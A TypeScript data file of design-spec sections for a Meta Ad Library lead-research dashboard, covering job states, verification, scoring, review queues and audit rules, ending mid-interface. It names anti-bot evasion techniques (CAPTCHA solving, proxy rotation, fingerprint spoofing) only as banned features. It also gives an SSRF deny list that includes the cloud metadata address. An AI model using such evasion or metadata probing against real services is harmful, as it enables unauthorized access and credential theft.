export interface Phase08Section {
  id: string;
  number: string;
  title: string;
  summary: string;
  content: string;
  keyTakeaways: string[];
}

export const PHASE_08_SECTIONS: Phase08Section[] = [
  {
    id: 'p8-sec-01',
    number: '01',
    title: 'Architectural Separation & Non-Scraper Doctrine',
    summary: 'The dashboard and Chrome Extension operate exclusively as an operator cockpit and control layer; neither performs scraping or DOM extraction.',
    content: `### 1. Architectural Role & Boundary Enforcement

The Phase 08 application layer is designed under an absolute architectural boundary: **the frontend dashboard and the Chrome Manifest V3 extension are strictly operator-facing presentation, control, and export interfaces.** They do NOT perform scraping, DOM parsing, network stealth emulation, CAPTCHA solving, or direct database querying.

\`\`\`
       +-------------------------------------------------------+
       |             OPERATOR PRESENTATION LAYER               |
       |                                                       |
       |   +--------------------+     +--------------------+   |
       |   | React Dashboard UI |     | Chrome MV3 Popup   |   |
       |   +---------+----------+     +---------+----------+   |
       +-------------|--------------------------|--------------+
                     |                          |
                     |  Typed Versioned REST    |  Runtime Message
                     |  & SSE (/api/v1/*)       |  to Background SW
                     v                          v
       +-------------------------------------------------------+
       |            APPLICATION BFF / API GATEWAY              |
       |  - Auth & Tenant Validation                           |
       |  - Idempotency & Rate Limiting                        |
       |  - Formula Sanitization & Export Streaming            |
       +-------------+--------------------------+--------------+
                     |                          |
        Job Controls |             Read Models  | (v_lead_research_current)
                     v                          v
       +--------------------+     +----------------------------+
       | Playwright Worker  |     | PostgreSQL 16+ Database    |
       | Orchestrator       |     | (32 Tables, Immutable)     |
       +--------------------+     +----------------------------+
\`\`\`

### Absolute Prohibitions in the Client Layer
1. **No Client-Side Scraping**: Neither the dashboard nor the Chrome Extension contains Playwright, Puppeteer, or DOM evaluation scripts against Meta Ad Library pages.
2. **No Evasion or Stealth Controls**: No UI toggles for proxy rotation, browser fingerprint alteration, or automated CAPTCHA bypassing.
3. **No Direct Database Access**: No PostgreSQL connections, direct SQL execution, or database credential exposure in client assets.
4. **No Fabrication**: If an ad field or business detail was not captured, it is labeled explicitly as \`Not available\` or \`Not observed\`. Inferred values are never disguised as observed facts.`,
    keyTakeaways: [
      'Frontend is purely an operator control & review interface.',
      'Scraping is strictly owned by the Phase 02/03 backend browser worker.',
      'Zero anti-bot evasion, proxy rotation, or CAPTCHA solving controls in the UI.'
    ]
  },
  {
    id: 'p8-sec-02',
    number: '02',
    title: 'Phase-07 Read Model Traceability',
    summary: 'Direct mapping from Phase 07 PostgreSQL normalized tables and views to frontend models, API routes, and components.',
    content: `### Traceability from Authoritative Phase-07 Contracts

Every data card, table, and metric shown in Phase 08 traces back directly to the relational persistence layer finalized in Phase 07:

1. **Active Research Jobs & Runs**:
   - *Phase 07 Schema*: \`job_execution\` (Layer F), \`job_checkpoint\`, \`execution_event\`.
   - *BFF Endpoint*: \`GET /api/v1/jobs\`, \`POST /api/v1/jobs\`, \`GET /api/v1/jobs/:id/runs\`.
   - *Frontend Model*: \`ResearchJobModel\`.
   - *Component*: \`JobControlWorkspace\`, \`ActiveRunMonitor\`.

2. **Advertiser Directory & Canonical State**:
   - *Phase 07 Schema*: \`canonical_advertiser\` (Layer B), \`v_lead_research_current\`, \`advertiser_domain_link\`.
   - *BFF Endpoint*: \`GET /api/v1/advertisers\`, \`GET /api/v1/advertisers/:id\`.
   - *Frontend Model*: \`AdvertiserViewModel\`.
   - *Component*: \`AdvertiserDetailView\`, \`CanonicalVsHistoricalPanel\`.

3. **Ad Creative Asset & Copy**:
   - *Phase 07 Schema*: \`ad_observation\` (Layer A), \`ad_creative_asset\`, \`raw_dom_token\`.
   - *BFF Endpoint*: \`GET /api/v1/advertisers/:id/ads\`.
   - *Frontend Model*: \`AdViewModel\`.
   - *Component*: \`AdDetailInspector\`.

4. **Destination Reachability & SSRF Probes**:
   - *Phase 07 Schema*: \`verification_run\` (Layer D), \`verification_evidence\`, \`network_probe_result\`.
   - *BFF Endpoint*: \`GET /api/v1/destinations/:id/verification\`.
   - *Frontend Model*: \`VerificationSummaryModel\`.
   - *Component*: \`VerificationInspector\`.

5. **Lead Qualification & Signal Explanations**:
   - *Phase 07 Schema*: \`qualification_snapshot\` (Layer E), \`score_signal_contribution\`, \`model_registry\`.
   - *BFF Endpoint*: \`GET /api/v1/qualification/:advertiserId\`.
   - *Frontend Model*: \`QualificationSummaryModel\`.
   - *Component*: \`QualificationSummary\`, \`ScoreExplanationTable\`.

6. **Identity Ambiguity & Manual Overrides**:
   - *Phase 07 Schema*: \`identity_review_queue\` (Layer C), \`manual_override\` (Layer E), \`audit_event\` (Layer G).
   - *BFF Endpoint*: \`GET /api/v1/reviews/identity\`, \`POST /api/v1/qualification/:id/override\`.
   - *Frontend Model*: \`IdentityReviewPairModel\`, \`ManualOverrideSubmission\`.
   - *Component*: \`IdentityConflictQueue\`, \`ManualOverrideModal\`.`,
    keyTakeaways: [
      'No data is rendered without a defined Phase 07 backing table or view.',
      'BFF routes decouple relational tables from client presentation schemas.',
      'Preserves complete provenance hashes from Phase 03 raw DOM tokens.'
    ]
  },
  {
    id: 'p8-sec-03',
    number: '03',
    title: 'Application Architecture & BFF Gateway',
    summary: 'The Backend-For-Frontend (BFF) orchestrates authentication, tenant derivation, cursor pagination, and sanitized output streaming.',
    content: `### 3. Application Gateway & BFF Responsibilities

The BFF layer acts as the single point of entry for both the React Dashboard and the Chrome Manifest V3 Extension.

\`\`\`
Client (Browser / Extension)
       |
       | 1. HTTP/2 with Authorization: Bearer <token>
       v
  BFF Gateway
       |-- 2. Tenant Context Extraction (JWT claim: tenant_id)
       |-- 3. Idempotency Check (Redis key: idemp:{tenant}:{key})
       |-- 4. Rate Limiter (Token bucket: 60 req/min per user)
       |-- 5. Read Model Dispatch (PostgreSQL read replica)
       |-- 6. Job Control Dispatch (Worker Orchestrator gRPC)
       +-- 7. Response Schema Validation (ajv/zod v1.0.0)
\`\`\`

### Client-Side vs Server-Side Responsibilities
- **Client Owns**: Responsive layout, tab navigation, local filter states, keyboard accessibility, form input validation (as a convenience affordance), and toast notifications.
- **Client Does NOT Own**: Final authorization, tenant assignment, scoring calculation, identity clustering, or database mutation truth. All client validation is strictly convenience; the server validates authoritatively.`,
    keyTakeaways: [
      'BFF handles all security, tenant enforcement, and idempotency.',
      'Client does not perform scoring or identity resolution algorithms.',
      'API contracts are strictly typed and versioned under /api/v1.'
    ]
  },
  {
    id: 'p8-sec-04',
    number: '04',
    title: 'Dashboard Information Architecture',
    summary: 'Structured multi-view dashboard segregating operational control, entity inspection, verification, qualification, reviews, and exports.',
    content: `### 4. Modular Information Architecture

To avoid a visually overloaded single-screen layout, the dashboard is organized into focused operational domains:

1. **Overview & Active Monitor**: High-level campaign metrics, active worker status, recent completions, and challenge alerts.
2. **Research Workspace & Job Control**: Search parameter creation, idempotency management, active run progress tracking, and batch inspection.
3. **Advertisers Directory**: Canonical business listing with multi-faceted filtering (qualification state, domain, active ads, verification).
4. **Advertiser Detail & Historical Dossier**: Detailed view comparing current canonical state with chronological observation history.
5. **Ad Creative & Copy Inspector**: Individual ad cards displaying public Ad Library IDs, start dates, observed copy, headlines, and extraction status.
6. **Destination & Network Verification**: Destination accessibility, HTTP status, TLS cipher negotiation, and SSRF private-IP blocking proofs.
7. **Qualification & Score Explainer**: Mathematical breakdown of signal contributions, active compliance blockers, and model registry metadata.
8. **Review Queues**: Triaging workflows for identity conflicts, verification ambiguities, and qualification borderline corridors.
9. **Export Pipeline**: Safe export generator with profile selection, column customization, and formula injection defenses.
10. **Audit & Activity Log**: Chronological operator ledger recording job creations, review decisions, manual overrides, and export generation.`,
    keyTakeaways: [
      'Organized into 10 cohesive operational workspaces.',
      'Eliminates single-screen cognitive overload.',
      'Provides dedicated screens for deep inspection and review triage.'
    ]
  },
  {
    id: 'p8-sec-05',
    number: '05',
    title: 'Primary User Workflow & State Transitions',
    summary: 'The sequential 8-stage pipeline from search definition and validation to automated run, review, and safe export.',
    content: `### 5. Deterministic Operator Lifecycle

Every research operation follows a disciplined linear lifecycle with explicit state transitions:

\`\`\`
[1. Define Search]
       ↓
[2. Validate Config]   --> (Field-level errors; blocks submission)
       ↓
[3. Create Job]        --> (Generates client UUIDv7 idempotency key)
       ↓
[4. Start Run]         --> (Orchestrator dispatches to Playwright worker)
       ↓
[5. Monitor Progress]  --> (Real-time progress % and checkpoint token)
       ↓
[6. Inspect Entities]  --> (Advertisers, Ads, Verification, Scores)
       ↓
[7. Triage Reviews]    --> (Resolve ambiguities & record manual overrides)
       ↓
[8. Safe Export]       --> (Formula-sanitized CSV/JSON artifact download)
\`\`\`

Every transition exposes state transitions explicitly. If an operation is suspended or fails, the user is never left with an empty or ambiguous screen.`,
    keyTakeaways: [
      'Strict 8-step lifecycle guarantees predictable execution.',
      'Idempotent submission eliminates duplicate worker executions.',
      'Reviews and overrides occur before final export distribution.'
    ]
  },
  {
    id: 'p8-sec-06',
    number: '06',
    title: 'Job Creation UI & Supported Controls',
    summary: 'Job configuration form restricted exclusively to supported Meta Ad Library filters defined in Phase 02.',
    content: `### 6. Job Creation Form Specification

The job creation interface exposes only controls supported by the Phase 02 browser automation worker. Fake or unsupported Meta UI toggles are strictly prohibited.

| Field Name | Description | Allowed Values | Requirement | Validation Rule |
| :--- | :--- | :--- | :--- | :--- |
| \`query\` | Commercial search keyword | UTF-8 string (1-200 chars) | Mandatory | Non-empty, no control chars |
| \`countryCode\` | Target country market | ISO 3166-1 alpha-2 (e.g., 'US') | Mandatory | Supported country list |
| \`adActiveStatus\` | Ad status filter | 'ACTIVE', 'ALL' | Mandatory | Enum constraint |
| \`mediaType\` | Media creative filter | 'ALL', 'IMAGE', 'MEME', 'VIDEO' | Optional | Enum constraint |
| \`maxResults\` | Upper limit on ads to collect | 10 to 500 (default: 100) | Mandatory | Integer within bounds |
| \`executionTimeoutSeconds\` | Max run duration | 60 to 1800 (default: 600) | Mandatory | Timeout guardrail |
| \`idempotencyKey\` | Client deduplication token | UUIDv7 string | Auto-generated | Valid UUID format |

### Anti-Slop Rule
The UI never presents sliders or checkboxes for unsupported capabilities such as "Bypass regional blocks", "Rotate residential proxies", or "Deep stealth mode".`,
    keyTakeaways: [
      'Only exposes validated Phase 02 parameters.',
      'Prevents unsupported or fictitious search criteria.',
      'Validates bounds on client and server before dispatch.'
    ]
  },
  {
    id: 'p8-sec-07',
    number: '07',
    title: 'Job Validation & Idempotency Enforcement',
    summary: 'Client submission locking combined with UUIDv7 idempotency keys guarantees zero duplicate worker dispatches.',
    content: `### 7. Preventing Duplicate Submissions

In high-throughput lead research, accidental double-clicks or browser retries can spawn duplicate browser worker runs, wasting proxy bandwidth and compute budget.

\`\`\`
Operator Clicks "Create Research Job"
       |
       v
1. Generate UUIDv7 Idempotency Key (e.g., idemp_01j7p8x9...)
2. Set Client Form State = SUBMITTING (Button disabled + spinner)
3. Send POST /api/v1/jobs with header: Idempotency-Key: <UUIDv7>
       |
       v
Backend BFF Validates:
  - Has this key been processed in the last 24 hours for tenant?
  - IF YES: Return existing Job ID (HTTP 200 OK, cached response)
  - IF NO: Create job in job_execution table, enqueue run (HTTP 201 Created)
\`\`\`

If form validation fails, structured errors are anchored directly beneath the offending input field with clear remediation instructions. Generic messages like "An error occurred" are forbidden.`,
    keyTakeaways: [
      'UUIDv7 idempotency keys attached to every job creation request.',
      'Backend deduplication ensures safe network retry semantics.',
      'Structured inline errors pinpoint exact validation failures.'
    ]
  },
  {
    id: 'p8-sec-08',
    number: '08',
    title: '14-State Job Lifecycle & Progress Semantics',
    summary: 'Deterministic mapping of all Phase 02/07 job states with unambiguous visual badges and progress semantics.',
    content: `### 8. Full Job Lifecycle State Machine

The system defines 14 deterministic states. UI badges, colors, and accessibility attributes map 1:1 to these states without renaming or masking semantics:

\`\`\`
          +--> PAUSED <---> [Resume / Cancel]
          |
CREATED -> QUEUED -> STARTING -> NAVIGATING -> COLLECTING -> VALIDATING -> CHECKPOINTING
                                                   |
              +------------------------------------+-----------------------------+
              |                                    |                             |
              v                                    v                             v
          COMPLETED                             PARTIAL                  BLOCKED / CHALLENGED
     (All targets met)                    (Stopped at limit)             (Anti-bot trigger)
\`\`\`

### State Definitions
1. **CREATED**: Job registered in database; awaiting scheduling.
2. **QUEUED**: Assigned to worker queue; waiting for available browser node.
3. **STARTING**: Playwright browser container launching.
4. **NAVIGATING**: Browser loading Meta Ad Library search URL.
5. **COLLECTING**: Actively parsing ad cards and scrolling search results.
6. **VALIDATING**: Normalizing extracted tokens and checking checksums.
7. **CHECKPOINTING**: Persisting intermediate batch to PostgreSQL Layer A/B.
8. **PAUSED**: Suspended by operator command.
9. **BLOCKED**: Network or IP level restriction encountered.
10. **CHALLENGED**: Meta displayed anti-bot challenge (immediate stop).
11. **COMPLETED**: Reached requested limit cleanly.
12. **PARTIAL**: Reached end of available results before requested limit.
13. **FAILED**: Unrecoverable worker crash or timeout.
14. **CANCELLED**: Terminated by explicit operator action.`,
    keyTakeaways: [
      'All 14 states mapped deterministically to UI visual elements.',
      'Includes explicit intermediate states (NAVIGATING, CHECKPOINTING).',
      'No state masking or synthetic smoothing.'
    ]
  },
  {
    id: 'p8-sec-09',
    number: '09',
    title: 'Partial Results UX & Checkpoint Integrity',
    summary: 'When a job stops before the requested count, it is explicitly labeled PARTIAL with processed count, stop reason, and checkpoint token.',
    content: `### 9. Transparent Partial Result Presentation

In web-scale research, search queries frequently exhaust available active ads before reaching a target limit (e.g., only 38 active ads exist for a niche query when 100 were requested).

### The Golden Rule of Partial Results
**Under no circumstances may a partial job be presented as COMPLETED.**

The UI renders an amber status card with:
- **Status**: \`PARTIAL\`
- **Processed Count**: \`38 / 100 requested ads\`
- **Stop Reason**: \`WORKER_PAGINATION_LIMIT_REACHED_END_OF_SEARCH_CARDS\`
- **Last Valid Checkpoint**: \`chk_01j7p8x90003_offset_38\`
- **Recommended Action**: The operator is informed that all active ads for the keyword were captured, and that expanding search terms or checking back in 7 days is recommended.

Partial results remain fully inspectable, verifiable, and exportable. They are never discarded or hidden.`,
    keyTakeaways: [
      'Partial jobs are never masked as complete.',
      'Exposes exact stop reasons and checkpoint tokens.',
      'All collected records in partial runs remain fully usable.'
    ]
  },
  {
    id: 'p8-sec-10',
    number: '10',
    title: 'Anti-Bypass Block & Challenge UX',
    summary: 'When Meta security challenges are detected, the system immediately halts and presents an honest operator state without evasion controls.',
    content: `### 10. Anti-Bypass Doctrine & Challenge Handling

When Meta Ad Library prompts a CAPTCHA, authentication wall, or security challenge, the browser worker halts immediately and records \`CHALLENGED\` or \`BLOCKED\` status with a timestamp and checkpoint.

### UI Requirements for Challenge State
1. **Explicit Operator Notice**: The dashboard displays a red shield banner indicating:
   *"Meta Ad Library presented an anti-bot security challenge. Automation suspended immediately."*
2. **Preserved Progress**: All records extracted prior to the challenge event remain securely persisted and available in the database.
3. **Strict Ban on Evasion Controls**:
   - The UI MUST NOT offer "Solve CAPTCHA with 2Captcha".
   - The UI MUST NOT offer "Rotate Residential IP Pool".
   - The UI MUST NOT offer "Spoof Canvas/WebGL Fingerprint".
4. **Permitted Operator Actions**:
   - Review captured checkpoint data.
   - Mark run as acknowledged.
   - Defer re-execution until cooling period expires.`,
    keyTakeaways: [
      'Automation halts immediately upon challenge detection.',
      'Zero bypass, evasion, or CAPTCHA-solving options.',
      'Preserves all data collected prior to challenge event.'
    ]
  },
  {
    id: 'p8-sec-11',
    number: '11',
    title: 'Search Results & Canonical Advertiser Directory',
    summary: 'High-density, accessible tabular directory of canonical advertisers with real-time status badges, score metrics, and quick filters.',
    content: `### 11. Canonical Advertiser Directory Model

The search results table serves as the primary gateway for lead researchers. It displays authoritative canonical data with explicit semantic indicators:

| Column | Data Source | Semantic State | Notes |
| :--- | :--- | :--- | :--- |
| **Advertiser** | \`canonical_advertiser.canonical_name\` | CANONICAL | Verified legal or primary trading name |
| **Ad Library ID** | \`canonical_advertiser.ad_library_page_id\` | OBSERVED | External public ID on Meta |
| **Active Ads** | \`COUNT(ad_observation)\` | DERIVED | Continuous ads active in last 30d |
| **Domain** | \`canonical_domain.registrable_domain\` | NORMALIZED | e.g., \`solarflowenergy.com\` |
| **Website** | \`verification_run.status_code\` | VERIFIED | Reachability indicator (HTTP 200) |
| **Score** | \`qualification_snapshot.total_score\` | CALCULATED | Deterministic score (0.00 to 100.00) |
| **Status** | \`qualification_snapshot.qualification_state\` | DETERMINED | QUALIFIED / DISQUALIFIED / REVIEW |
| **Freshness** | \`verification_run.completed_at\` | OBSERVED | Relative time (e.g., "22m ago") |

Clicking any row opens the full Advertiser Dossier without navigating away from filter context.`,
    keyTakeaways: [
      'Displays authoritative canonical entities.',
      'Clear visual distinction between observed and calculated values.',
      'Supports sorting by score, active ads, and verification freshness.'
    ]
  },
  {
    id: 'p8-sec-12',
    number: '12',
    title: 'Advertiser Detail View (Canonical vs Historical)',
    summary: 'Dossier view separating current canonical values from chronological historical observations without overwriting past state.',
    content: `### 12. Preserving Historical Truth vs Current State

Advertisers frequently alter their public display names, landing page domains, or business structure over time. A common flaw in lead software is overwriting historical observations with the latest crawl.

### Phase 08 Dual-State Layout
The Advertiser Detail screen implements a side-by-side or tabbed dual-state view:

1. **Current Canonical Dossier**:
   - Legal Entity: *SolarFlow Energy Solutions LLC*
   - Primary Domain: *solarflowenergy.com*
   - Current Score: *86.5 / 100 (HIGH Confidence)*
   - Current Qualification: *QUALIFIED*

2. **Historical Observation Log**:
   - \`2026-09-16 08:18 UTC\`: Observed name *"SolarFlow Energy Solutions LLC"* (Token #tok_001)
   - \`2026-08-10 12:00 UTC\`: Observed name *"Solar Flow Texas Clean Energy"* (Token #tok_042)
   - \`2026-07-01 09:30 UTC\`: Domain redirected from *solarflowtx.com* to *solarflowenergy.com*

Past observations are permanently preserved for legal, audit, and provenance compliance.`,
    keyTakeaways: [
      'Historical observations are never overwritten by new crawls.',
      'Side-by-side presentation of current vs historical names.',
      'Maintains complete chronological provenance.'
    ]
  },
  {
    id: 'p8-sec-13',
    number: '13',
    title: 'Ad Detail View & Creative Provenance',
    summary: 'Deep inspection of individual advertisement creatives, observed copy, CTA text, targeting platforms, and extraction statuses.',
    content: `### 13. Advertisement Creative & Metadata Inspector

Each ad card exposes granular details captured by the Phase 03 extraction engine:

- **Public Meta Ad Library ID**: Exact identifier linking to public record.
- **Observed Ad Copy**: Exact verbatim body text extracted from DOM.
- **Headline & Call-to-Action**: Detected headline and CTA button label (e.g., *"Get Quote"*).
- **Run Dates**: First seen timestamp and continuous duration.
- **Distribution Platforms**: Visible platform icons (Facebook, Instagram, Messenger, Audience Network).
- **Destination Landing Page URL**: Direct link observed on ad CTA click.
- **Extraction Status**:
  - \`SUCCESS\`: All required fields parsed cleanly.
  - \`NOT_OBSERVED\`: Optional field was absent in DOM (e.g., ad had no CTA button).
  - \`EXTRACTION_FAILED\`: Selector failed or timed out during card evaluation.
- **Cryptographic Evidence Hash**: SHA-256 hash of the raw DOM token snippet proving content authenticity.`,
    keyTakeaways: [
      'Exposes verbatim ad copy, headlines, and call-to-action buttons.',
      'Explicit extraction status prevents confusing missing data with extraction bugs.',
      'Includes cryptographic DOM snippet hash for audit verification.'
    ]
  },
  {
    id: 'p8-sec-14',
    number: '14',
    title: 'Business Destination & Website Verification UI',
    summary: 'Distinguishing simple website reachability from verified commercial business identity support.',
    content: `### 14. Reachability vs Business Identity Support

A critical tenet of lead qualification is distinguishing between:
1. **Website Reachable**: A web server answered on port 443 with HTTP 200.
2. **Business Identity Supported**: The website content explicitly corroborates the advertiser's registered business identity.

### Visual Presentation
\`\`\`
+-------------------------------------------------------------------+
| DESTINATION VERIFICATION: solarflowenergy.com                     |
|                                                                   |
| [✓] NETWORK REACHABLE                 [✓] BUSINESS IDENTITY MATCH |
| HTTP Status: 200 OK                   Matched Legal LLC in footer |
| TLS: 1.3 (AEAD-CHACHA20-POLY1305)     Matched Phone: (800) 555-01 |
| DNS Egress: 104.21.48.12 (Public)     Commercial Intent Form: YES |
| SSRF Check: PASSED (No RFC 1918)      License # verified: YES     |
+-------------------------------------------------------------------+
\`\`\`

If a domain is reachable (HTTP 200) but belongs to a parked domain registrar or generic template, the UI displays:
\`NETWORK REACHABLE\` (Green) but \`BUSINESS IDENTITY UNSUPPORTED\` (Yellow warning).`,
    keyTakeaways: [
      'Prevents false positives from parked or generic domains.',
      'Exposes exact TLS cipher and network probe outputs.',
      'Verifies commercial intent lead capture forms.'
    ]
  },
  {
    id: 'p8-sec-15',
    number: '15',
    title: 'Verification Freshness & SSRF Probe Transparency',
    summary: 'Displaying exact network probe timestamps, SSRF safety assertions, and cache staleness indicators.',
    content: `### 15. Freshness & Network Security Transparency

Network verification evidence has a finite shelf-life. A website functional 60 days ago may have expired or changed hands today.

### Freshness Guardrails
- **Fresh (< 24 hours)**: Green freshness pill (\`Fresh: 22m ago\`).
- **Valid (< 7 days)**: Neutral freshness pill (\`Fresh: 3d ago\`).
- **Stale (> 7 days)**: Amber warning pill (\`STALE: 14d ago — Re-probe recommended\`).

### SSRF Defense Transparency
To reassure compliance auditors, the verification inspector displays:
- **Egress IP**: Public IPv4/IPv6 address resolved by dedicated probe worker.
- **SSRF Safety**: Explicit assertion confirming destination does not resolve to private subnets (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, or cloud metadata \`169.254.169.254\`).`,
    keyTakeaways: [
      'Color-coded freshness tiers highlight decaying evidence.',
      'Explicit SSRF audit proof verifies safe outbound probing.',
      'Operators can trigger on-demand re-probes for stale records.'
    ]
  },
  {
    id: 'p8-sec-16',
    number: '16',
    title: 'Qualification Summary, Signals & Blocker Visibility',
    summary: 'Comprehensive view of positive commercial signals, negative evidence, missing tokens, and hard compliance blockers.',
    content: `### 16. Evidence-Driven Lead Qualification Summary

Lead qualification is not an opaque "AI score". It is a deterministic composite of rule-based signals established in Phase 06.

### Four-Quadrant Evidence Breakdown
1. **Positive Signals (Green)**:
   - 8 active ads running continuously for >30 days (+25.0)
   - Reachable destination domain with valid TLS 1.3 (+25.0)
   - High-intent commercial keywords: "schedule quote", "tax rebate" (+20.0)
   - Verified matching legal LLC in footer (+16.5)
2. **Negative Evidence (Amber)**:
   - Brand name mismatch between Ad Library title and website copyright legal entity (-10.0)
3. **Missing Evidence (Neutral)**:
   - State professional contractor license number not extracted from landing page
   - Better Business Bureau (BBB) accreditation token absent
4. **Active Blockers (Red)**:
   - If any hard blocker is triggered (e.g., \`BLOCKER_PROHIBITED_FINANCIAL_CLAIMS\`), score is immediately forced to 0.00 and status set to \`DISQUALIFIED\`.`,
    keyTakeaways: [
      'Four distinct evidence categories eliminate ambiguity.',
      'Hard blockers override all positive signals deterministically.',
      'Shows exactly what signals are missing to reach qualification.'
    ]
  },
  {
    id: 'p8-sec-17',
    number: '17',
    title: 'Deterministic Score Explanations & Rule Versioning',
    summary: 'Granular mathematical explanation table breaking down every positive and negative point contribution by rule ID and evidence.',
    content: `### 17. The Score Explanation Matrix

For every evaluated advertiser, operators can expand the **Score Explanation Table**. Each row documents:

\`\`\`
Signal: Active Advertising Volume
  Contribution: +25.0 pts
  Rule ID: RULE_ACTIVE_AD_VOLUME (v2.1)
  Evidence: "8 distinct active ad campaigns observed across 38 days"
  Reasoning: Demonstrates active paid customer acquisition budget and ongoing operations.

Signal: Domain Reachability & SSL
  Contribution: +25.0 pts
  Rule ID: RULE_DOMAIN_VERIFICATION (v2.0)
  Evidence: "solarflowenergy.com returned HTTP 200 with TLS 1.3"
  Reasoning: Legitimate active commercial web infrastructure.

Signal: Identity Match
  Contribution: +16.5 pts
  Rule ID: RULE_IDENTITY_MATCH (v1.9)
  Evidence: "Ad title matches website footer legal LLC name"
  Reasoning: High consistency between public advertisement and registered business.

TOTAL SCORE: 86.5 / 100.00 (QUALIFIED)
\`\`\`

No points are granted without an associated Rule ID, Rule Version, and verifiable evidence snippet.`,
    keyTakeaways: [
      'Every point earned or deducted is attributed to a specific rule.',
      'Preserves rule versions for historical auditability.',
      'Eliminates unexplainable black-box lead scoring.'
    ]
  },
  {
    id: 'p8-sec-18',
    number: '18',
    title: 'Model Registry & Scoring Version Transparency',
    summary: 'Every score record displays the active model identifier, semantic version, and evaluation timestamp.',
    content: `### 18. Model Registry Governance in the UI

Scoring rules evolve over time as compliance regulations and market conditions shift. Phase 08 guarantees that scores are permanently tied to their evaluation model version.

### Model Header Card
Every score panel prominently displays:
- **Model Name**: \`lead_qualification_engine\`
- **Model Version**: \`v2.4.0-stable\`
- **Calculated At**: \`2026-09-16T08:24:30Z\`
- **Evaluation Status**: \`DETERMINISTIC_ACTIVE\`

If a historical score was computed under an earlier version (e.g., \`v1.8.2\`), the UI preserves that version string and alerts the operator if a newer model is available for re-evaluation.`,
    keyTakeaways: [
      'Model ID and semantic version permanently attached to scores.',
      'Historical results retain the exact model version used at runtime.',
      'Supports side-by-side shadow mode comparisons where configured.'
    ]
  },
  {
    id: 'p8-sec-19',
    number: '19',
    title: 'Review Queue Architecture & Triage Lifecycle',
    summary: 'Unified review queue architecture routing identity ambiguities, verification conflicts, and borderline qualification cases to human operators.',
    content: `### 19. Review Queue Triaging Architecture

Automated algorithms cannot resolve all edge cases. Phase 08 establishes three dedicated human review queues:

1. **Identity Ambiguity Queue**:
   - Triggered when entity clustering confidence falls between 0.70 and 0.89.
   - Presents candidate entity pairs for merge or split confirmation.
2. **Verification Conflict Queue**:
   - Triggered when destination website is reachable but footer legal entity conflicts with ad title.
3. **Qualification Borderline Queue**:
   - Triggered when score falls within the review corridor (e.g., 50.0 to 64.9) or when high-value signals conflict.

### Review Item Data Envelope
Each review item contains:
\`{ id, type, entityId, issueDescription, evidenceDetails, status, createdAt, allowedActions }\`.
Resolved items move to the completed ledger; unresolved items cannot be silently dismissed.`,
    keyTakeaways: [
      'Three dedicated review queues for edge-case resolution.',
      'Items cannot be silently ignored or deleted without an audit event.',
      'Provides structured evidence comparison for rapid human decisions.'
    ]
  },
  {
    id: 'p8-sec-20',
    number: '20',
    title: 'Identity Ambiguity Review & Pair Resolution',
    summary: 'Operator interface for comparing Entity A and Entity B side-by-side to confirm merges or declare distinct businesses.',
    content: `### 20. Entity Pair Comparison Interface

When the Phase 04 entity resolution engine detects two advertisers that may represent the same commercial enterprise, it creates an identity review item:

\`\`\`
+------------------------------+------------------------------+
| ENTITY A: Apex Roofing       | ENTITY B: Apex Coastal Group |
| Ad Lib ID: 11029384751       | Ad Lib ID: 88371920194       |
| Domain: apexroofingfl.com    | Domain: apexcoastalgroup.com |
| Active Ads: 3                | Active Ads: 5                |
+------------------------------+------------------------------+
| MATCHING SIGNALS:                                           |
| - Shared contact phone: +1 (407) 555-0144 in footer         |
| - Shared corporate address: 1400 Orange Ave, Orlando, FL    |
| - Registered officer match: Robert Vance (CEO in Sunbiz)    |
|                                                             |
| CONFLICTING SIGNALS:                                        |
| - Different domain hostnames and Meta Page IDs              |
|                                                             |
| CONFIDENCE: 88% (SAME_BUSINESS)                             |
+-------------------------------------------------------------+
| ACTIONS: [CONFIRM MATCH]   [CONFIRM DISTINCT]   [DEFER]     |
+-------------------------------------------------------------+
\`\`\`

Selecting **CONFIRM MATCH** invokes the Phase 07 \`merge_split_ledger\` transaction, deactivating the duplicate entity while preserving all historical observation links.`,
    keyTakeaways: [
      'Side-by-side comparison of matching and conflicting signals.',
      'Confirming match triggers atomic Phase 07 database merge transaction.',
      'Decisions are non-destructive and fully reversible.'
    ]
  },
  {
    id: 'p8-sec-21',
    number: '21',
    title: 'Verification Conflict Resolution & Audit Logging',
    summary: 'Resolving discrepancies between landing page claims and corporate registries with mandatory reason recording.',
    content: `### 21. Verification Conflict Workflows

When automated web crawlers detect discrepancies (such as an agency running ads for a client with a different corporate name in the footer), the verification conflict queue allows an operator to:

1. **Accept Alternate Identity**: Confirm that the landing page footer represents the parent holding company or marketing agency.
2. **Reject Destination Link**: Sever the link between the ad and the destination domain if the domain appears spoofed or hijacked.
3. **Defer**: Request automated re-probe during the next scheduled worker batch.

Every decision requires:
- Authenticated Operator ID
- Mandatory Reason Code
- Optional Audit Notes
- Automatic insertion into Layer G \`audit_event\` table.`,
    keyTakeaways: [
      'Handles complex agency-client and holding company scenarios.',
      'Mandatory reason code recording for every resolution.',
      'Directly links resolution to immutable audit ledger.'
    ]
  },
  {
    id: 'p8-sec-22',
    number: '22',
    title: 'Auditable Manual Overrides & Immutability Guarantees',
    summary: 'Human operators can adjust scores for special business contexts without mutating underlying algorithmic evidence.',
    content: `### 22. Immutable Evidence & Score Overrides

In professional lead research, human operators may possess off-platform knowledge (e.g., verifying a local contractor license directly with a state licensing board).

### Strict Override Rules
1. **Never Overwrite Raw Evidence**: The automated qualification score (e.g., 67.0) and all underlying rule contributions remain unchanged in the database.
2. **Append-Only Override Record**: A new record is inserted into \`manual_override\` containing:
   - \`original_score\`: 67.0
   - \`override_score\`: 82.0
   - \`reason_code\`: \`EXTERNAL_BUSINESS_PROOF\`
   - \`notes\`: *"Verified state dental board license #DDS-77491 directly in state registry."*
   - \`reviewer_id\`: \`operator_daniela_leadops\`
   - \`applied_at\`: Current UTC timestamp
3. **UI Transparency**: In the dashboard, an overridden lead displays an explicit **MANUAL OVERRIDE** badge showing both the algorithmic score and the override value.`,
    keyTakeaways: [
      'Underlying evidence and algorithmic scores are never mutated.',
      'Overrides write append-only records to manual_override table.',
      'UI clearly displays both original and overridden values.'
    ]
  },
  {
    id: 'p8-sec-23',
    number: '23',
    title: 'Frontend API Client & Typed Endpoint Contracts',
    summary: 'Unified, versioned TypeScript API client enforcing schema validation, error envelopes, and bearer authorization.',
    content: `### 23. Typed API Client Architecture

All network communication between the frontend and the BFF is routed through a single typed API client (\`src/services/apiClient.ts\`).

### Core Interface Signatures
\`\`\`typescript
interface LeadResearchApiClient {
